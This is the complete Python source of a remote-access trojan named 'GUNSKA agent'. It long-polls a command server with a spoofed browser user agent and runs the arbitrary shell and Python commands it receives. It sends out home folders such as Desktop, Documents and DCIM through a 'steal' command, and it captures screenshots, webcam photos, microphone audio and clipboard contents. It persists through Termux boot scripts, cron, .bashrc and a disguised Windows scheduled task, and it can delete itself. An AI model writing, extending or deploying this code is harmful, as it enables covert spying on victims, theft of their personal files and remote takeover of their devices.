#!/usr/bin/env python3
"""GUNSKA agent — HTTPS long-poll, stdlib only."""
import base64
import json
import os
import platform
import random
import secrets
import shutil
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.request

BASE = "__BASE__"
TOKEN = "__TOKEN__"
NAME = "__NAME__"
POLL = 1.0
CH = 512 * 1024
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
SIDF = os.path.join(tempfile.gettempdir(), ".sid")
UPS = {}


def _sid():
    try:
        s = open(SIDF).read().strip()
        if len(s) == 16:
            return s
    except Exception:
        pass
    s = secrets.token_hex(8)
    try:
        with open(SIDF, "w") as f:
            f.write(s)
    except Exception:
        pass
    return s


SID = _sid()


def http(path, data=None, timeout=40):
    sep = "&" if "?" in path else "?"
    r = urllib.request.Request(BASE + path + sep + "t=" + TOKEN, data=data, headers=UA)
    with urllib.request.urlopen(r, timeout=timeout) as f:
        return f.read()


def post(o, timeout=40):
    try:
        http("/r/" + SID, json.dumps(o).encode(), timeout)
    except Exception:
        pass


def out(rid, txt):
    if txt:
        post({"t": "out", "id": rid, "d": txt})


def which(b):
    return shutil.which(b)


def sh(c, t=90):
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        return "[timeout]\n"
    except Exception as e:
        return "ERR %s\n" % e


def info():
    d = {"host": platform.node(), "os": platform.platform(), "arch": platform.machine(),
         "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
         "cwd": os.getcwd(), "pid": os.getpid(), "python": sys.version.split()[0],
         "termux": os.environ.get("PREFIX", "").startswith("/data/data/com.termux")}
    try:
        s = __import__("socket").socket(2, 2)
        s.connect(("8.8.8.8", 80))
        d["ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        d["ip"] = "?"
    return d


def screen():
    p = os.path.join(tempfile.gettempdir(), "s_%d.png" % time.time())
    for t in (["screencap", "-p", p], ["scrot", "-z", p], ["import", "-window", "root", p],
              ["gnome-screenshot", "-f", p], ["spectacle", "-b", "-n", "-o", p],
              ["screencapture", "-x", p]):
        if which(t[0]):
            try:
                subprocess.run(t, capture_output=True, timeout=40)
            except Exception:
                pass
            if os.path.exists(p) and os.path.getsize(p) > 0:
                return p
    if os.name == "nt":
        ps = ("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
              "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
              "$i=New-Object Drawing.Bitmap $b.Width,$b.Height;"
              "$g=[Drawing.Graphics]::FromImage($i);"
              "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
              "$i.Save('%s')" % p.replace("\\", "\\\\"))
        try:
            subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True, timeout=60)
        except Exception:
            pass
        if os.path.exists(p):
            return p
    return None


def cam():
    p = os.path.join(tempfile.gettempdir(), "c_%d.jpg" % time.time())
    for t in (["termux-camera-photo", "-c", "0", p], ["fswebcam", "-q", "--no-banner", p],
              ["ffmpeg", "-y", "-f", "v4l2", "-i", "/dev/video0", "-frames:v", "1", p],
              ["imagesnap", "-q", p]):
        if which(t[0]):
            try:
                subprocess.run(t, capture_output=True, timeout=40)
            except Exception:
                pass
            if os.path.exists(p) and os.path.getsize(p) > 0:
                return p
    return None


def send_file(rid, path):
    try:
        size = os.path.getsize(path)
    except Exception as e:
        out(rid, "ERR %s\n" % e)
        return
    fid = secrets.token_hex(6)
    name = os.path.basename(path)
    out(rid, "[file] %s (%d b)\n" % (name, size))
    i = 0
    with open(path, "rb") as f:
        while True:
            b = f.read(CH)
            if not b:
                break
            post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i,
                  "d": base64.b64encode(b).decode(), "last": False})
            i += 1
    post({"t": "file", "id": rid, "fid": fid, "name": name, "i": i, "last": True, "size": size})


def _tmp(prefix):
    fd, p = tempfile.mkstemp(prefix=prefix)
    os.close(fd)
    return p


def persist():
    home = os.path.expanduser("~")
    self_path = os.path.abspath(__file__)
    cmd = "%s %s" % (sys.executable, self_path)
    done = []

    boot_dir = os.path.join(home, ".termux", "boot")
    if os.path.isdir(os.path.join(home, ".termux")):
        os.makedirs(boot_dir, exist_ok=True)
        p = os.path.join(boot_dir, "svc.sh")
        with open(p, "w") as f:
            f.write("#!/data/data/com.termux/files/usr/bin/sh\n"
                    "termux-wake-lock\nnohup %s >/dev/null 2>&1 &\n" % cmd)
        os.chmod(p, 0o755)
        done.append("termux-boot")

    if which("crontab"):
        line = "@reboot nohup %s >/dev/null 2>&1 & # gunska" % cmd
        current = sh("crontab -l 2>/dev/null")
        if line not in current:
            tmp = _tmp("gs_cron")
            with open(tmp, "w") as f:
                f.write(current.rstrip("\n") + "\n" + line + "\n")
            sh("crontab %s" % tmp)
            os.remove(tmp)
            done.append("cron")

    rc = os.path.join(home, ".bashrc")
    if os.path.exists(rc):
        try:
            body = open(rc, encoding="utf-8", errors="replace").read()
        except Exception:
            body = ""
        if "gunska" not in body:
            with open(rc, "a") as f:
                f.write("\n# gunska\n(pgrep -f '%s' >/dev/null 2>&1 || nohup %s >/dev/null 2>&1 &)\n"
                        % (os.path.basename(self_path), cmd))
            done.append("bashrc")

    if os.name == "nt":
        sh('schtasks /create /tn SysSvc /tr "\\"%s\\" \\"%s\\"" /sc onlogon /f'
           % (sys.executable, self_path))
        done.append("schtasks")

    return ", ".join(done) or "none"


def unpersist():
    home = os.path.expanduser("~")
    self_base = os.path.basename(os.path.abspath(__file__))
    done = []

    p = os.path.join(home, ".termux", "boot", "svc.sh")
    if os.path.exists(p):
        try:
            os.remove(p)
            done.append("boot")
        except Exception:
            pass

    if which("crontab"):
        current = sh("crontab -l 2>/dev/null")
        keep = [l for l in current.splitlines()
                if "gunska" not in l and "svc.sh" not in l and self_base not in l]
        if len(keep) != len(current.splitlines()):
            tmp = _tmp("gs_cron")
            with open(tmp, "w") as f:
                f.write("\n".join(keep) + "\n")
            sh("crontab %s" % tmp)
            os.remove(tmp)
            done.append("cron")

    rc = os.path.join(home, ".bashrc")
    if os.path.exists(rc):
        try:
            lines = open(rc, encoding="utf-8", errors="replace").read().splitlines()
        except Exception:
            lines = []
        keep = [l for l in lines if "# gunska" not in l and self_base not in l]
        if len(keep) != len(lines):
            with open(rc, "w") as f:
                f.write("\n".join(keep) + "\n")
            done.append("bashrc")

    if os.name == "nt":
        sh("schtasks /delete /tn SysSvc /f")
        done.append("schtasks")

    return ", ".join(done) or "none"


def run_shell(rid, cmd, limit=120):
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             stdin=subprocess.DEVNULL, cwd=os.getcwd())
    except Exception as e:
        out(rid, "ERR %s\n" % e)
        return

    buf = []
    killed = {"v": False}

    def flush():
        if buf:
            out(rid, "".join(buf))
            buf.clear()

    def killer():
        killed["v"] = True
        try:
            p.kill()
        except Exception:
            pass

    tm = threading.Timer(limit, killer)
    tm.start()
    last = time.time()
    try:
        for ln in iter(p.stdout.readline, b""):
            buf.append(ln.decode("utf-8", "replace"))
            if len(buf) >= 20 or time.time() - last > 0.4:
                flush()
                last = time.time()
    finally:
        tm.cancel()
        try:
            p.wait(timeout=5)
        except Exception:
            pass
        flush()
    if killed["v"]:
        out(rid, "\n[timeout %ds]\n" % limit)
    out(rid, "\n[rc=%s]\n" % p.returncode)


def handle(m):
    t = m.get("t")
    rid = m.get("id")
    a = m.get("a") or ""

    if t == "noop":
        return

    if t == "shell":
        run_shell(rid, a)

    elif t == "py":
        b = {}
        try:
            exec(compile(a, "<r>", "exec"), b)
            out(rid, str(b.get("r", "")) + "\n")
        except Exception:
            import traceback
            out(rid, traceback.format_exc())

    elif t == "cd":
        try:
            os.chdir(os.path.expanduser(a))
            out(rid, os.getcwd() + "\n")
        except Exception as e:
            out(rid, "ERR %s\n" % e)

    elif t == "pwd":
        out(rid, os.getcwd() + "\n")

    elif t == "ls":
        tg = a or "."
        out(rid, sh('dir "%s"' % tg) if os.name == "nt" else
            sh("ls -la --color=never '%s'" % tg.replace("'", "'\\''")))

    elif t == "get":
        send_file(rid, os.path.expanduser(a))

    elif t == "grab":
        src = os.path.expanduser(a or ".")
        tmp = os.path.join(tempfile.gettempdir(), "g_%d.tar.gz" % time.time())
        try:
            with tarfile.open(tmp, "w:gz") as tf:
                tf.add(src, arcname=os.path.basename(os.path.abspath(src)))
            send_file(rid, tmp)
        except Exception as e:
            out(rid, "ERR %s\n" % e)
        finally:
            if os.path.exists(tmp):
                os.remove(tmp)

    elif t == "steal":
        home = os.path.expanduser("~")
        names = ["Desktop", "Documents", "Downloads", "Pictures", "DCIM", "Movies", "Music"]
        tmp = os.path.join(tempfile.gettempdir(), "st_%d.tar.gz" % time.time())
        try:
            with tarfile.open(tmp, "w:gz") as tf:
                for n in names:
                    p = os.path.join(home, n)
                    if os.path.isdir(p):
                        try:
                            tf.add(p, arcname=n)
                        except Exception:
                            pass
            send_file(rid, tmp)
        except Exception as e:
            out(rid, "ERR %s\n" % e)
        finally:
            if os.path.exists(tmp):
                os.remove(tmp)

    elif t == "info":
        out(rid, json.dumps(info(), indent=2) + "\n")

    elif t == "ps":
        out(rid, sh("tasklist") if os.name == "nt" else sh("ps aux"))

    elif t == "shot":
        f = screen()
        if f:
            send_file(rid, f)
        else:
            out(rid, "no screenshot backend\n")

    elif t == "cam":
        f = cam()
        if f:
            send_file(rid, f)
        else:
            out(rid, "no camera backend\n")

    elif t == "clip":
        if m.get("op") == "set":
            if which("termux-clipboard-set"):
                sh("termux-clipboard-set '%s'" % a.replace("'", ""))
            elif which("xclip"):
                sh("echo '%s' | xclip -sel c" % a)
            elif which("pbcopy"):
                sh("echo '%s' | pbcopy" % a)
            out(rid, "ok\n")
        else:
            r = ""
            if which("termux-clipboard-get"):
                r = sh("termux-clipboard-get")
            elif which("pbpaste"):
                r = sh("pbpaste")
            elif which("xclip"):
                r = sh("xclip -o -sel c")
            out(rid, r + "\n")

    elif t == "toast":
        sh("termux-toast '%s'" % a.replace("'", ""))
        out(rid, "ok\n")

    elif t == "vibrate":
        sh("termux-vibrate -d %s" % (a or "800"))
        out(rid, "ok\n")

    elif t == "audio":
        try:
            n = max(1, min(120, int(a or 6)))
        except ValueError:
            n = 6
        f = os.path.join(tempfile.gettempdir(), "a_%d.m4a" % time.time())
        sh("termux-microphone-record -l %d -f '%s'" % (n, f), t=n + 30)
        if os.path.exists(f) and os.path.getsize(f) > 0:
            send_file(rid, f)
        else:
            out(rid, "no audio backend\n")

    elif t == "persist":
        out(rid, persist() + "\n")

    elif t == "unpersist":
        out(rid, unpersist() + "\n")

    elif t == "put_begin":
        UPS[m["fid"]] = {"n": os.path.basename(m.get("name") or "f.bin"), "b": []}

    elif t == "put_chunk":
        e = UPS.get(m["fid"])
        if e is not None:
            e["b"].append(base64.b64decode(m.get("d") or ""))

    elif t == "put_end":
        e = UPS.pop(m["fid"], None)
        if e:
            d = os.path.join(os.getcwd(), e["n"])
            with open(d, "wb") as f:
                f.write(b"".join(e["b"]))
            out(rid, "saved %s (%d b)\n" % (d, os.path.getsize(d)))

    elif t == "sd":
        try:
            unpersist()
        except Exception:
            pass
        out(rid, "bye\n")
        time.sleep(1)
        try:
            os.remove(os.path.abspath(__file__))
        except Exception:
            pass
        os._exit(0)

    elif t == "kill":
        out(rid, "bye\n")
        time.sleep(1)
        os._exit(0)


def main():
    back = 2
    while True:
        try:
            post({"t": "hello", "info": info()})
            break
        except Exception:
            time.sleep(back)
            back = min(back * 2, 60)

    while True:
        try:
            raw = http("/p/" + SID, timeout=45)
            cmds = json.loads(raw).get("c", [])
            back = 2
        except Exception:
            time.sleep(back)
            back = min(back * 2, 60)
            continue
        for c in cmds:
            try:
                handle(c)
            except Exception as e:
                out(c.get("id"), "ERR %s\n" % e)
        time.sleep(POLL + random.random())


if __name__ == "__main__":
    main()
